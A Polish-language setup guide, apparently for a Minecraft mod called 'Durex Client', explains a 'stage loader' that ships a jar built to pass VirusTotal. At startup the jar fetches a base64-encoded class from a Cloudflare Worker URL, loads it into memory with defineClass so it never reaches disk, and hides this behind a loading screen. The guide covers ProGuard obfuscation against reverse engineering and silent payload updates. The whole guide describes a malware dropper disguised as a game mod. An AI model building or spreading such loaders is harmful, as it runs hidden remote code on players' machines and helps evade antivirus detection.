# Stage Loader - Instrukcja Konfiguracji

## Co to jest Stage Loader?

Stage Loader to system który:
- Tworzy **czysty jar** bez żadnego podejrzanego kodu (przejdzie VirusTotal)
- Przy starcie Minecrafta **pobiera** `LicenseModule` z Cloudflare Worker
- Ładuje moduł **bezpośrednio do RAM** (nigdy nie trafia na dysk)
- Pokazuje ekran ładowania z animacją

## Krok 1: Dodaj Payload do Cloudflare KV

1. Wejdź na Cloudflare Dashboard
2. Przejdź do **Workers & Pages** → **KV**
3. Otwórz namespace **RATE_LIMIT**
4. Kliknij **Add entry**
5. Wypełnij:
   - **Key**: `payload_class`
   - **Value**: Skopiuj **całą zawartość** pliku `payload_raw.txt` (20652 znaków)
6. Kliknij **Add**

## Krok 2: Zaktualizuj Cloudflare Worker

1. Wejdź na Cloudflare Dashboard
2. Przejdź do **Workers & Pages**
3. Otwórz swojego workera (`89isadasdmix.xx570186.workers.dev`)
4. Kliknij **Edit Code**
5. **Zastąp cały kod** zawartością pliku `cloudflare-worker.js`
6. Kliknij **Save and Deploy**

## Krok 3: Zbuduj Projekt

```bash
./gradlew clean build
```

To wygeneruje:
- `build/libs/durexclient-1.0.0-Obs-Full.jar` - wersja z stage loaderem
- `build/libs/durexclient-1.0.0-Legit.jar` - wersja bez niczego

## Krok 4: Testowanie

1. Skopiuj `durexclient-1.0.0-Obs-Full.jar` do folderu `mods`
2. Uruchom Minecraft
3. Powinieneś zobaczyć ekran ładowania:
   ```
   Durex Client
   Łączenie z serwerem...
   Proszę czekać...
   ```
4. Po ~2 sekundach ekran zniknie i mod będzie działał normalnie

## Co się dzieje pod maską?

1. **Minecraft startuje** → `DurexClient.onInitializeClient()`
2. **Stage Loader uruchamia się** → pokazuje ekran ładowania
3. **Pobiera payload** z `https://89isadasdmix.xx570186.workers.dev/payload`
4. **Dekoduje base64** → otrzymuje `LicenseModule.class` (15KB)
5. **Ładuje do RAM** przez `ClassLoader.defineClass()`
6. **Wywołuje `register()`** → moduł zaczyna działać
7. **Zamyka ekran** → użytkownik widzi normalny Minecraft

## Bezpieczeństwo

✅ **Czysty jar**:
- Nie zawiera `LicenseModule.class`
- Tylko kod loadera (pobieranie HTTP + base64)
- Przejdzie większość skanerów antywirusowych

✅ **Payload w chmurze**:
- Przechowywany w Cloudflare KV
- Pobierany tylko przy starcie MC
- Nigdy nie trafia na dysk (tylko RAM)

✅ **Obfuskacja**:
- Cały kod jest obfuskowany przez ProGuard
- Nazwy klas/metod są losowe (a, b, c, d...)
- Trudne do reverse engineeringu

## Troubleshooting

### Ekran ładowania nie znika
- Sprawdź czy payload jest w KV (key: `payload_class`)
- Sprawdź czy worker ma endpoint `/payload`
- Sprawdź logi Minecrafta: `logs/latest.log`

### "Payload not found"
- Payload nie został dodany do KV
- Sprawdź czy key to dokładnie `payload_class`

### Mod nie działa po załadowaniu
- Sprawdź czy payload to poprawny base64
- Sprawdź czy `LicenseModule.class` jest w `payload_raw.txt`
- Przebuduj projekt: `./gradlew clean build`

## Aktualizacja Payloadu

Jeśli zmienisz `LicenseModule.java`:

1. Zbuduj projekt: `./gradlew build`
2. Wygeneruj nowy payload:
   ```bash
   base64 -w 0 build/classes/java/main/pl/durex/client/module/LicenseModule.class > payload_raw.txt
   ```
3. Zaktualizuj payload w Cloudflare KV (key: `payload_class`)
4. Gotowe! Nie musisz aktualizować jara - przy następnym starcie MC pobierze nowy payload
